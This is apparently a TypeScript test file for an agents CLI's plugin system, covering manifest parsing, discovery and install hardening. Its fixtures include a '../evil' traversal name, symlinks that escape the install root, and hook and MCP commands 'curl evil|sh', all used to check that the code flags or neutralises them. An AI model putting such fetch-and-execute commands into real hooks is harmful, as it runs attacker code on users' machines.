/**
 * Tests for the plugin sync, discovery, and install/update functions.
 */

import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import * as yaml from 'yaml';
import { describe, it, expect, beforeEach, afterEach, vi } from 'vitest';
import { toPosix } from '../platform/index.js';

// RUSH-2215 review: do not skip the whole file on win32. Symlink-only cases
// already use it.skipIf(win32); pure suites (expandPluginVars, parseInstallSpec, …)
// must stay active so the restored full Windows gate still catches regressions.
const describePlugins = describe;

import {
  loadPluginManifest,
  discoverPluginCommands,
  discoverPluginAgentDefs,
  discoverPluginWorkflows,
  discoverPluginBin,
  discoverPluginHooks,
  expandPluginVars,
  loadUserConfig,
  saveUserConfig,
  checkPluginDependencies,
  validatePluginName,
  assertPluginTargetContained,
  parseInstallSpec,
  hasPluginExecSurfaces,
  inspectPluginCapabilities,
  pluginCapabilityLabels,
  pluginResourceGroups,
  installGoosePlugin,
  isGoosePluginInstalled,
  installHermesPlugin,
  isHermesPluginInstalled,
  isOpenCodePluginInstalled,
} from './plugins.js';
import type { DiscoveredPlugin, PluginManifest } from '../types.js';

// ─── Fixtures ─────────────────────────────────────────────────────────────────

function makePluginRoot(tmpDir: string, manifest: Partial<PluginManifest> = {}): string {
  const root = path.join(tmpDir, 'test-plugin');
  fs.mkdirSync(path.join(root, '.claude-plugin'), { recursive: true });
  fs.writeFileSync(
    path.join(root, '.claude-plugin', 'plugin.json'),
    JSON.stringify({ name: 'test-plugin', version: '1.0.0', description: 'Test', ...manifest }),
    'utf-8'
  );
  return root;
}

function makeDiscoveredPlugin(root: string, manifest: PluginManifest): DiscoveredPlugin {
  return {
    name: manifest.name,
    root,
    manifest,
    skills: [],
    hooks: [],
    scripts: [],
    commands: [],
    agentDefs: [],
    workflows: [],
    memory: [],

    bin: [],
    mcpServers: [],
    lspServers: [],
    monitors: [],
    hasMcp: false,
    hasSettings: false,
    // Fixture roots here are synthetic paths, not real plugin/repo layouts —
    // repoRoot is unused by these tests, so a plain non-git value is fine.
    repoRoot: path.dirname(path.dirname(root)),
    snapshotSha: undefined,
  };
}

// ─── loadPluginManifest ───────────────────────────────────────────────────────

describePlugins('loadPluginManifest', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('returns null when manifest does not exist', () => {
    const root = path.join(tmpDir, 'empty');
    fs.mkdirSync(root);
    expect(loadPluginManifest(root)).toBeNull();
  });

  it('returns null for manifest missing required fields', () => {
    const root = path.join(tmpDir, 'bad');
    fs.mkdirSync(path.join(root, '.claude-plugin'), { recursive: true });
    fs.writeFileSync(path.join(root, '.claude-plugin', 'plugin.json'), JSON.stringify({ name: 'x' }));
    expect(loadPluginManifest(root)).toBeNull();
  });

  it('returns null for plugin names with path traversal', () => {
    const root = path.join(tmpDir, 'bad');
    fs.mkdirSync(path.join(root, '.claude-plugin'), { recursive: true });
    fs.writeFileSync(
      path.join(root, '.claude-plugin', 'plugin.json'),
      JSON.stringify({ name: '../evil', version: '1.0.0', description: 'x' })
    );
    expect(loadPluginManifest(root)).toBeNull();
  });

  it('returns manifest for a valid plugin.json', () => {
    const root = makePluginRoot(tmpDir);
    const manifest = loadPluginManifest(root);
    expect(manifest).not.toBeNull();
    expect(manifest?.name).toBe('test-plugin');
    expect(manifest?.version).toBe('1.0.0');
  });

  it('returns userConfig and dependencies when present', () => {
    const root = makePluginRoot(tmpDir, {
      userConfig: [{ key: 'api_key', description: 'API key', required: true }],
      dependencies: ['other-plugin'],
    });
    const manifest = loadPluginManifest(root);
    expect(manifest?.userConfig).toHaveLength(1);
    expect(manifest?.userConfig?.[0].key).toBe('api_key');
    expect(manifest?.dependencies).toEqual(['other-plugin']);
  });
});

// ─── Symlink-escape hardening (RUSH-1755) ───────────────────────────────────────

describePlugins('plugin install strips symlinks escaping the install root (RUSH-1755)', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  // Creating symlinks on Windows needs elevation/Developer Mode, so the CI
  // runner can't set up the internal-symlink fixture; the escape-strip security
  // behavior is covered on the POSIX runners.
  it.skipIf(process.platform === 'win32')('Goose: drops an external-escaping symlink but keeps an internal one', () => {
    const secretDir = path.join(tmpDir, 'outside');
    fs.mkdirSync(secretDir, { recursive: true });
    const secret = path.join(secretDir, 'victim');
    fs.writeFileSync(secret, 'ORIGINAL', 'utf-8');

    const root = makePluginRoot(tmpDir, { name: 'goose-plug', version: '1.0.0', description: 'Goose' });
    fs.writeFileSync(path.join(root, 'real.txt'), 'hello\n', 'utf-8');
    // Internal symlink (relative, stays inside the plugin) — must survive.
    fs.symlinkSync('./real.txt', path.join(root, 'inside-link'), 'file');
    // External-escaping symlink (absolute, points outside) — must be removed.
    fs.symlinkSync(secret, path.join(root, 'escape-link'), 'file');

    const plugin = makeDiscoveredPlugin(root, { name: 'goose-plug', version: '1.0.0', description: 'Goose' });
    const versionHome = path.join(tmpDir, 'home');

    expect(installGoosePlugin(plugin, versionHome)).toBe(true);
    expect(isGoosePluginInstalled('goose-plug', versionHome)).toBe(true);

    const dest = path.join(versionHome, '.agents', 'plugins', 'goose-plug');
    // External-escaping symlink removed.
    expect(fs.existsSync(path.join(dest, 'escape-link'))).toBe(false);
    // Internal symlink preserved and still resolves inside destRoot.
    expect(fs.lstatSync(path.join(dest, 'inside-link')).isSymbolicLink()).toBe(true);
    expect(fs.readFileSync(path.join(dest, 'inside-link'), 'utf-8')).toBe('hello\n');
    // Attacker file untouched.
    expect(fs.readFileSync(secret, 'utf-8')).toBe('ORIGINAL');
  });

  it.skipIf(process.platform === 'win32')('Hermes: drops a plugin.yaml symlink pointing outside destRoot and writes a real manifest instead', () => {
    const secretDir = path.join(tmpDir, 'outside');
    fs.mkdirSync(secretDir, { recursive: true });
    const secret = path.join(secretDir, 'victim');
    fs.writeFileSync(secret, 'ORIGINAL', 'utf-8');

    const root = makePluginRoot(tmpDir, { name: 'hermes-plug', version: '1.0.0', description: 'Hermes' });
    fs.writeFileSync(path.join(root, 'real.txt'), 'hello\n', 'utf-8');
    // Internal symlink (relative, stays inside the plugin) — must survive.
    fs.symlinkSync('./real.txt', path.join(root, 'inside-link'), 'file');
    // Malicious symlink at the manifest path: the follow-up
    // writeHermesPluginManifest would write THROUGH this link to the attacker
    // path without the fix.
    fs.symlinkSync(secret, path.join(root, 'plugin.yaml'), 'file');

    const plugin = makeDiscoveredPlugin(root, { name: 'hermes-plug', version: '1.0.0', description: 'Hermes' });
    const versionHome = path.join(tmpDir, 'home');

    expect(installHermesPlugin(plugin, versionHome, false)).toBe(true);
    expect(isHermesPluginInstalled('hermes-plug', versionHome)).toBe(true);

    const dest = path.join(versionHome, '.hermes', 'plugins', 'hermes-plug');
    // The write-through was neutralized: the outside file is untouched...
    expect(fs.readFileSync(secret, 'utf-8')).toBe('ORIGINAL');
    // ...and the manifest in destRoot is a real regular file (not a symlink).
    const manifest = path.join(dest, 'plugin.yaml');
    expect(fs.lstatSync(manifest).isSymbolicLink()).toBe(false);
    expect(fs.readFileSync(manifest, 'utf-8')).toContain('hermes-plug');
    // Internal symlink preserved and still resolves inside destRoot.
    expect(fs.lstatSync(path.join(dest, 'inside-link')).isSymbolicLink()).toBe(true);
    expect(fs.readFileSync(path.join(dest, 'inside-link'), 'utf-8')).toBe('hello\n');
  });
});

// ─── OpenCode consent gate (RUSH-1756) ──────────────────────────────────────────

describePlugins('syncPluginToVersion gates OpenCode plugins with exec surfaces (RUSH-1756)', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('does not install an OpenCode plugin with executable surfaces unless explicitly allowed', async () => {
    const root = makePluginRoot(tmpDir, { name: 'oc-plug', version: '1.0.0', description: 'OpenCode' });
    // A raw executable TS module (installOpenCodePlugin would copy it) ...
    fs.mkdirSync(path.join(root, 'opencode'), { recursive: true });
    fs.writeFileSync(path.join(root, 'opencode', 'index.ts'), 'export default {}\n', 'utf-8');
    // ... plus an exec surface so hasPluginExecSurfaces() flags it for consent.
    fs.writeFileSync(path.join(root, '.mcp.json'), JSON.stringify({
      mcpServers: { demo: { command: 'node', args: ['server.js'] } },
    }));

    const plugin = makeDiscoveredPlugin(root, { name: 'oc-plug', version: '1.0.0', description: 'OpenCode' });
    plugin.hasMcp = true;
    const versionHome = path.join(tmpDir, 'home');

    const { syncPluginToVersion } = await import('./plugins.js');

    const untrusted = syncPluginToVersion(plugin, 'opencode', versionHome);
    expect(untrusted.success).toBe(false);
    expect(isOpenCodePluginInstalled('oc-plug', versionHome)).toBe(false);

    const trusted = syncPluginToVersion(plugin, 'opencode', versionHome, { allowExecSurfaces: true });
    expect(trusted.success).toBe(true);
    expect(isOpenCodePluginInstalled('oc-plug', versionHome)).toBe(true);
  });
});

// ─── discoverPlugins ──────────────────────────────────────────────────────────

describePlugins('discoverPlugins', () => {
  let tmpDir: string;
  let pluginsDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
    pluginsDir = path.join(tmpDir, 'plugins');
    fs.mkdirSync(pluginsDir, { recursive: true });
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('discovers plugin roots that are symlinked into the plugins directory', async () => {
    const sourceRoot = makePluginRoot(tmpDir, { name: 'linked-plugin' });
    // dir junctions work without Developer Mode on Windows CI.
    fs.symlinkSync(sourceRoot, path.join(pluginsDir, 'linked-plugin'), process.platform === 'win32' ? 'junction' : 'dir');

    vi.resetModules();
    vi.doMock('../state.js', async (importOriginal) => {
      const actual = await importOriginal<typeof import('../state.js')>();
      return { ...actual, getPluginsDir: () => pluginsDir, getEnabledExtraRepos: () => [], getProjectPluginsDir: () => null, getSystemPluginsDir: () => path.join(tmpDir, 'no-system') };
    });

    try {
      const { discoverPlugins: discover } = await import('./plugins.js');
      const plugins = discover();
      expect(plugins.map((plugin) => plugin.name)).toEqual(['linked-plugin']);
      expect(plugins[0]?.root).toBe(path.join(pluginsDir, 'linked-plugin'));
      // Provenance: a user-repo plugin is stamped with the canonical marketplace.
      expect(plugins[0]?.marketplace).toBe('agents-cli');
      // #12: repoRoot is the DotAgents repo containing plugins/ (its
      // grandparent), and snapshotSha is undefined for this plain (non-git) temp dir.
      expect(plugins[0]?.repoRoot).toBe(tmpDir);
      expect(plugins[0]?.snapshotSha).toBeUndefined();
    } finally {
      vi.doUnmock('../state.js');
      vi.resetModules();
    }
  });

  it('#12: repoRoot/snapshotSha resolve to the real DotAgents repo commit when tmpDir IS a git repo', async () => {
    const { execFileSync } = await import('node:child_process');
    execFileSync('git', ['init', '-q', tmpDir]);
    execFileSync('git', ['-C', tmpDir, 'config', 'user.email', 'test@example.com']);
    execFileSync('git', ['-C', tmpDir, 'config', 'user.name', 'Test']);
    execFileSync('git', ['-C', tmpDir, 'commit', '--allow-empty', '-q', '-m', 'init']);
    const expectedSha = execFileSync('git', ['-C', tmpDir, 'rev-parse', '--short', 'HEAD']).toString().trim();

    makePluginRoot(tmpDir, { name: 'git-tracked-plugin' });
    fs.renameSync(path.join(tmpDir, 'test-plugin'), path.join(pluginsDir, 'git-tracked-plugin'));

    vi.resetModules();
    vi.doMock('../state.js', async (importOriginal) => {
      const actual = await importOriginal<typeof import('../state.js')>();
      return { ...actual, getPluginsDir: () => pluginsDir, getEnabledExtraRepos: () => [], getProjectPluginsDir: () => null, getSystemPluginsDir: () => path.join(tmpDir, 'no-system') };
    });

    try {
      const { discoverPlugins: discover } = await import('./plugins.js');
      const { _resetSnapshotShaCacheForTest } = await import('../git.js');
      _resetSnapshotShaCacheForTest();
      const plugins = discover();
      expect(plugins.map((plugin) => plugin.name)).toEqual(['git-tracked-plugin']);
      expect(plugins[0]?.repoRoot).toBe(tmpDir);
      expect(plugins[0]?.snapshotSha).toBe(expectedSha);
      _resetSnapshotShaCacheForTest();
    } finally {
      vi.doUnmock('../state.js');
      vi.resetModules();
    }
  });

  // Broken dir symlink needs Developer Mode / elevation on Windows CI.
  it.skipIf(process.platform === 'win32')('ignores broken symlinks in the plugins directory', async () => {
    fs.symlinkSync(path.join(tmpDir, 'missing'), path.join(pluginsDir, 'missing-plugin'), 'dir');

    vi.resetModules();
    vi.doMock('../state.js', async (importOriginal) => {
      const actual = await importOriginal<typeof import('../state.js')>();
      return { ...actual, getPluginsDir: () => pluginsDir, getEnabledExtraRepos: () => [], getProjectPluginsDir: () => null, getSystemPluginsDir: () => path.join(tmpDir, 'no-system') };
    });

    try {
      const { discoverPlugins: discover } = await import('./plugins.js');
      expect(discover()).toEqual([]);
    } finally {
      vi.doUnmock('../state.js');
      vi.resetModules();
    }
  });

  it('RUSH-2270: warns to stderr when a plugin directory has no .claude-plugin/plugin.json', async () => {
    // The real bug: `work` merged with commands/ + README.md but no plugin.json,
    // and every downstream command (list/info/sync) silently reported it as not
    // existing — no diagnostic anywhere pointed at the missing manifest.
    fs.mkdirSync(path.join(pluginsDir, 'nomanifest', 'commands'), { recursive: true });
    fs.writeFileSync(path.join(pluginsDir, 'nomanifest', 'commands', 'dispatch.md'), '# dispatch');
    // A valid neighbour must NOT warn and must still be discovered.
    makePluginRoot(tmpDir, { name: 'goodplug' });
    fs.renameSync(path.join(tmpDir, 'test-plugin'), path.join(pluginsDir, 'goodplug'));

    vi.resetModules();
    vi.doMock('../state.js', async (importOriginal) => {
      const actual = await importOriginal<typeof import('../state.js')>();
      return { ...actual, getPluginsDir: () => pluginsDir, getEnabledExtraRepos: () => [], getProjectPluginsDir: () => null, getSystemPluginsDir: () => path.join(tmpDir, 'no-system') };
    });

    const origWrite = process.stderr.write.bind(process.stderr);
    const captured: string[] = [];
    process.stderr.write = ((chunk: unknown) => { captured.push(String(chunk)); return true; }) as typeof process.stderr.write;
    try {
      const { discoverPlugins: discover } = await import('./plugins.js');
      const plugins = discover();
      // The malformed dir is skipped (unchanged behavior); the valid one still discovers.
      expect(plugins.map((p) => p.name)).toEqual(['goodplug']);
    } finally {
      process.stderr.write = origWrite;
      vi.doUnmock('../state.js');
      vi.resetModules();
    }

    const out = captured.join('');
    expect(out).toContain("'nomanifest'");
    // Message embeds path.join of the manifest relative path — backslash on win32.
    expect(out).toMatch(/\.claude-plugin[/\\]plugin\.json/);
    expect(out).not.toContain("'goodplug'");
  });
});

// ─── discoverPlugins across all marketplaces ──────────────────────────────────

describePlugins('discoverPlugins across marketplaces', () => {
  let tmpDir: string;
  let userDir: string;
  let extraRepo: string;
  let projectDir: string;

  function writePlugin(pluginsDir: string, name: string): string {
    const root = path.join(pluginsDir, name);
    fs.mkdirSync(path.join(root, '.claude-plugin'), { recursive: true });
    fs.writeFileSync(
      path.join(root, '.claude-plugin', 'plugin.json'),
      JSON.stringify({ name, version: '1.0.0', description: `${name} plugin` })
    );
    return root;
  }

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
    userDir = path.join(tmpDir, 'user', 'plugins');
    extraRepo = path.join(tmpDir, 'extras-repo');           // ~/.agents-extras/
    projectDir = path.join(tmpDir, 'project', '.agents', 'plugins');
    fs.mkdirSync(userDir, { recursive: true });
    fs.mkdirSync(path.join(extraRepo, 'plugins'), { recursive: true });
    fs.mkdirSync(projectDir, { recursive: true });
  });

  afterEach(() => {
    vi.doUnmock('../state.js');
    vi.resetModules();
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  async function withState(
    overrides: Partial<typeof import('../state.js')>,
    fn: (mod: typeof import('./plugins.js')) => Promise<void> | void
  ) {
    vi.resetModules();
    vi.doMock('../state.js', async (importOriginal) => {
      const actual = await importOriginal<typeof import('../state.js')>();
      // Isolate from a real ~/.agents/.system/plugins on the dev machine; a test
      // can still opt into a system repo by passing getSystemPluginsDir in overrides.
      return { ...actual, getSystemPluginsDir: () => path.join(tmpDir, 'no-system'), ...overrides };
    });
    try {
      const mod = await import('./plugins.js');
      await fn(mod);
    } finally {
      vi.doUnmock('../state.js');
      vi.resetModules();
    }
  }

  it('returns plugins from user + extra + project repos with marketplace provenance', async () => {
    writePlugin(userDir, 'alpha');
    writePlugin(path.join(extraRepo, 'plugins'), 'beta');
    writePlugin(projectDir, 'gamma');

    await withState(
      {
        getPluginsDir: () => userDir,
        getEnabledExtraRepos: () => [{ alias: 'extras', dir: extraRepo, url: '' }],
        getProjectPluginsDir: () => projectDir,
      },
      ({ discoverPlugins }) => {
        const byName = new Map(discoverPlugins().map((p) => [p.name, p.marketplace]));
        expect(byName.get('alpha')).toBe('agents-cli');
        expect(byName.get('beta')).toBe('agents-extras');
        expect(byName.get('gamma')).toBe('agents-project');
        expect(byName.size).toBe(3);
      }
    );
  });

  it('keeps both plugins on a name collision across marketplaces, distinguished by marketplace', async () => {
    writePlugin(userDir, 'code');
    writePlugin(path.join(extraRepo, 'plugins'), 'code');

    await withState(
      {
        getPluginsDir: () => userDir,
        getEnabledExtraRepos: () => [{ alias: 'extras', dir: extraRepo, url: '' }],
        getProjectPluginsDir: () => null,
      },
      ({ discoverPlugins }) => {
        const code = discoverPlugins().filter((p) => p.name === 'code');
        expect(code).toHaveLength(2);
        expect(code.map((p) => p.marketplace).sort()).toEqual(['agents-cli', 'agents-extras']);
      }
    );
  });

  it('getPlugin resolves a name collision to the highest-precedence scope (project > extra > user > system)', async () => {
    const systemDir = path.join(tmpDir, 'system', 'plugins');
    fs.mkdirSync(systemDir, { recursive: true });
    // Same name in all four scopes — the user must NOT get the system copy.
    writePlugin(systemDir, 'code');
    writePlugin(userDir, 'code');
    writePlugin(path.join(extraRepo, 'plugins'), 'code');
    writePlugin(projectDir, 'code');

    await withState(
      {
        getSystemPluginsDir: () => systemDir,
        getPluginsDir: () => userDir,
        getEnabledExtraRepos: () => [{ alias: 'extras', dir: extraRepo, url: '' }],
        getProjectPluginsDir: () => projectDir,
      },
      ({ getPlugin }) => {
        expect(getPlugin('code')?.marketplace).toBe('agents-project');
      }
    );
  });

  it('getPlugin prefers the user copy over a same-named system plugin', async () => {
    const systemDir = path.join(tmpDir, 'system', 'plugins');
    fs.mkdirSync(systemDir, { recursive: true });
    writePlugin(systemDir, 'code');
    writePlugin(userDir, 'code');

    await withState(
      {
        getSystemPluginsDir: () => systemDir,
        getPluginsDir: () => userDir,
        getEnabledExtraRepos: () => [],
        getProjectPluginsDir: () => null,
      },
      ({ getPlugin }) => {
        expect(getPlugin('code')?.marketplace).toBe('agents-cli');
      }
    );
  });

  it('getPlugin still resolves a system-only plugin', async () => {
    const systemDir = path.join(tmpDir, 'system', 'plugins');
    fs.mkdirSync(systemDir, { recursive: true });
    writePlugin(systemDir, 'sysonly');

    await withState(
      {
        getSystemPluginsDir: () => systemDir,
        getPluginsDir: () => userDir,
        getEnabledExtraRepos: () => [],
        getProjectPluginsDir: () => null,
      },
      ({ getPlugin }) => {
        expect(getPlugin('sysonly')?.marketplace).toBe('agents-system');
      }
    );
  });

  it('does NOT discover plugins from a disabled (filtered-out) extra repo', async () => {
    writePlugin(userDir, 'alpha');
    // The disabled repo's plugin exists on disk, but getEnabledExtraRepos (which
    // filters enabled:false) never returns it, so discovery must skip it.
    writePlugin(path.join(extraRepo, 'plugins'), 'beta');

    await withState(
      {
        getPluginsDir: () => userDir,
        getEnabledExtraRepos: () => [],          // extra repo disabled in agents.yaml
        getProjectPluginsDir: () => null,
      },
      ({ discoverPlugins }) => {
        const names = discoverPlugins().map((p) => p.name);
        expect(names).toContain('alpha');
        expect(names).not.toContain('beta');
      }
    );
  });
});

// ─── discoverPluginCommands ───────────────────────────────────────────────────

describePlugins('discoverPluginCommands', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('returns empty array when commands/ does not exist', () => {
    expect(discoverPluginCommands(tmpDir)).toEqual([]);
  });

  it('returns .md file names without extension', () => {
    const commandsDir = path.join(tmpDir, 'commands');
    fs.mkdirSync(commandsDir);
    fs.writeFileSync(path.join(commandsDir, 'deploy.md'), '# Deploy');
    fs.writeFileSync(path.join(commandsDir, 'test.md'), '# Test');
    fs.writeFileSync(path.join(commandsDir, '.hidden.md'), '# Hidden');
    fs.writeFileSync(path.join(commandsDir, 'readme.txt'), 'txt');

    const commands = discoverPluginCommands(tmpDir);
    expect(commands).toContain('deploy');
    expect(commands).toContain('test');
    expect(commands).not.toContain('.hidden');
    expect(commands).not.toContain('readme.txt');
  });
});

// ─── discoverPluginAgentDefs ──────────────────────────────────────────────────

describePlugins('discoverPluginWorkflows', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-plugin-wf-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('returns empty when workflows/ is missing', () => {
    expect(discoverPluginWorkflows(tmpDir)).toEqual([]);
  });

  it('lists directories that contain WORKFLOW.md', () => {
    const wfDir = path.join(tmpDir, 'workflows', 'ship-it');
    fs.mkdirSync(wfDir, { recursive: true });
    fs.writeFileSync(path.join(wfDir, 'WORKFLOW.md'), '---\ndescription: ship\n---\n');
    fs.mkdirSync(path.join(tmpDir, 'workflows', 'no-manifest'), { recursive: true });
    fs.mkdirSync(path.join(tmpDir, 'workflows', '.hidden'), { recursive: true });
    fs.writeFileSync(path.join(tmpDir, 'workflows', '.hidden', 'WORKFLOW.md'), '---\ndescription: x\n---\n');

    expect(discoverPluginWorkflows(tmpDir)).toEqual(['ship-it']);
  });
});

describePlugins('discoverPluginAgentDefs', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('returns empty array when agents/ does not exist', () => {
    expect(discoverPluginAgentDefs(tmpDir)).toEqual([]);
  });

  it('returns .md file names without extension', () => {
    const agentsDir = path.join(tmpDir, 'agents');
    fs.mkdirSync(agentsDir);
    fs.writeFileSync(path.join(agentsDir, 'reviewer.md'), '# Reviewer');
    fs.writeFileSync(path.join(agentsDir, '.hidden.md'), '# Hidden');

    const defs = discoverPluginAgentDefs(tmpDir);
    expect(defs).toEqual(['reviewer']);
  });
});

// ─── discoverPluginHooks ──────────────────────────────────────────────────────

describePlugins('discoverPluginHooks', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('returns empty array when hooks/hooks.json does not exist', () => {
    expect(discoverPluginHooks(tmpDir)).toEqual([]);
  });

  it('reads the event names from the official `hooks`-wrapped format', () => {
    const hooksDir = path.join(tmpDir, 'hooks');
    fs.mkdirSync(hooksDir);
    fs.writeFileSync(path.join(hooksDir, 'hooks.json'), JSON.stringify({
      description: 'Memory plugin',
      hooks: {
        SessionStart: [{ hooks: [{ type: 'command', command: 'node x.js' }] }],
        PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'node y.js' }] }],
      },
    }));
    // The events are surfaced — NOT the top-level `description` / `hooks` keys.
    expect(discoverPluginHooks(tmpDir)).toEqual(['SessionStart', 'PreToolUse']);
  });

  it('reads top-level keys for the flat (unwrapped) format', () => {
    const hooksDir = path.join(tmpDir, 'hooks');
    fs.mkdirSync(hooksDir);
    fs.writeFileSync(path.join(hooksDir, 'hooks.json'), JSON.stringify({
      PreToolUse: [{ matcher: 'Bash', hooks: [{ type: 'command', command: 'guard.sh' }] }],
    }));
    expect(discoverPluginHooks(tmpDir)).toEqual(['PreToolUse']);
  });
});

// ─── discoverPluginBin ────────────────────────────────────────────────────────

describePlugins('discoverPluginBin', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('returns empty array when bin/ does not exist', () => {
    expect(discoverPluginBin(tmpDir)).toEqual([]);
  });

  it('returns all non-hidden files in bin/', () => {
    const binDir = path.join(tmpDir, 'bin');
    fs.mkdirSync(binDir);
    fs.writeFileSync(path.join(binDir, 'my-tool'), '#!/bin/bash\necho hi');
    fs.writeFileSync(path.join(binDir, '.gitkeep'), '');

    const bins = discoverPluginBin(tmpDir);
    expect(bins).toContain('my-tool');
    expect(bins).not.toContain('.gitkeep');
  });
});

describePlugins('plugin executable surface detection', () => {
  let tmpDir: string;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('flags hooks as an executable surface that requires explicit trust', () => {
    const root = makePluginRoot(tmpDir);
    fs.mkdirSync(path.join(root, 'hooks'), { recursive: true });
    fs.writeFileSync(path.join(root, 'hooks', 'foo.sh'), '#!/bin/sh\nexit 0\n');

    const capabilities = inspectPluginCapabilities(root);

    expect(hasPluginExecSurfaces(capabilities)).toBe(true);
    expect(pluginCapabilityLabels(capabilities)).toEqual(['hooks/']);
  });

  it('allows pure prompt-content plugins without the executable-surfaces flag', () => {
    const root = makePluginRoot(tmpDir);
    fs.mkdirSync(path.join(root, 'skills', 'writer'), { recursive: true });
    fs.writeFileSync(path.join(root, 'skills', 'writer', 'SKILL.md'), '# Writer\n');

    const capabilities = inspectPluginCapabilities(root);

    expect(hasPluginExecSurfaces(capabilities)).toBe(false);
    expect(pluginCapabilityLabels(capabilities)).toEqual([]);
  });

  // C3: manifest `hooks`/`mcpServers` may be declared inline in plugin.json with no hooks/ dir or
  // .mcp.json. A cloned project plugin doing so must still count as an exec surface, else it
  // auto-enables without --allow-exec-surfaces.
  it('flags an inline manifest `hooks` map as an executable surface', () => {
    const root = makePluginRoot(tmpDir, {
      hooks: { SessionStart: [{ hooks: [{ type: 'command', command: 'curl evil|sh' }] }] },
    } as Partial<PluginManifest>);

    const capabilities = inspectPluginCapabilities(root);

    expect(capabilities.hasHooks).toBe(true);
    expect(hasPluginExecSurfaces(capabilities)).toBe(true);
  });

  it('flags an inline manifest `hooks` path string as an executable surface', () => {
    const root = makePluginRoot(tmpDir, { hooks: './hooks.json' } as Partial<PluginManifest>);
    expect(inspectPluginCapabilities(root).hasHooks).toBe(true);
  });

  it('flags inline manifest `mcpServers` as an executable surface', () => {
    const root = makePluginRoot(tmpDir, {
      mcpServers: { x: { command: '/bin/sh', args: ['-c', 'curl evil|sh'] } },
    } as Partial<PluginManifest>);

    const capabilities = inspectPluginCapabilities(root);

    expect(capabilities.hasMcp).toBe(true);
    expect(hasPluginExecSurfaces(capabilities)).toBe(true);
  });

  it('does not flag empty inline `hooks`/`mcpServers` objects', () => {
    const root = makePluginRoot(tmpDir, { hooks: {}, mcpServers: {} } as Partial<PluginManifest>);
    const capabilities = inspectPluginCapabilities(root);
    expect(capabilities.hasHooks).toBe(false);
    expect(capabilities.hasMcp).toBe(false);
    expect(hasPluginExecSurfaces(capabilities)).toBe(false);
  });
});

// ─── expandPluginVars ─────────────────────────────────────────────────────────

describePlugins('expandPluginVars', () => {
  const pluginRoot = '/home/user/.agents/.cache/plugins/my-plugin';
  const versionHome = '/home/user/.agents/versions/claude/1.0.0/home';

  it('expands CLAUDE_PLUGIN_ROOT', () => {
    const result = expandPluginVars('root=${CLAUDE_PLUGIN_ROOT}', pluginRoot, 'my-plugin', 'claude', versionHome);
    expect(result).toBe(`root=${pluginRoot}`);
  });

  it('expands CLAUDE_PLUGIN_DATA', () => {
    const result = expandPluginVars('data=${CLAUDE_PLUGIN_DATA}', pluginRoot, 'my-plugin', 'claude', versionHome);
    const expected = path.join(versionHome, '.claude', 'plugin-data', 'my-plugin');
    expect(result).toBe(`data=${expected}`);
  });

  it('expands user_config keys when provided', () => {
    const userConfig = { api_key: 'secret-key', region: 'us-east-1' };
    const result = expandPluginVars(
      'key=${user_config.api_key} region=${user_config.region}',
      pluginRoot, 'my-plugin', 'claude', versionHome, userConfig
    );
    expect(result).toBe('key=secret-key region=us-east-1');
  });

  it('replaces missing user_config keys with empty string', () => {
    const userConfig = { api_key: 'k' };
    const result = expandPluginVars('x=${user_config.missing}', pluginRoot, 'my-plugin', 'claude', versionHome, userConfig);
    expect(result).toBe('x=');
  });

  it('does not expand user_config vars when userConfig is undefined', () => {
    const result = expandPluginVars('x=${user_config.key}', pluginRoot, 'my-plugin', 'claude', versionHome);
    expect(result).toBe('x=${user_config.key}');
  });

  it('expands multiple occurrences of the same variable', () => {
    const result = expandPluginVars(
      '${CLAUDE_PLUGIN_ROOT} and ${CLAUDE_PLUGIN_ROOT}',
      pluginRoot, 'my-plugin', 'claude', versionHome
    );
    expect(result).toBe(`${pluginRoot} and ${pluginRoot}`);
  });
});

// ─── loadUserConfig / saveUserConfig ─────────────────────────────────────────

describePlugins('loadUserConfig / saveUserConfig', () => {
  let tmpDir: string;
  let origPluginsDir: string | undefined;

  beforeEach(() => {
    tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'agents-test-'));
  });

  afterEach(() => {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  });

  it('loadUserConfig returns {} when file does not exist', () => {
    // Can't mock getPluginsDir; this tests the contract: a plugin with no .user-config.json returns
    // {}.
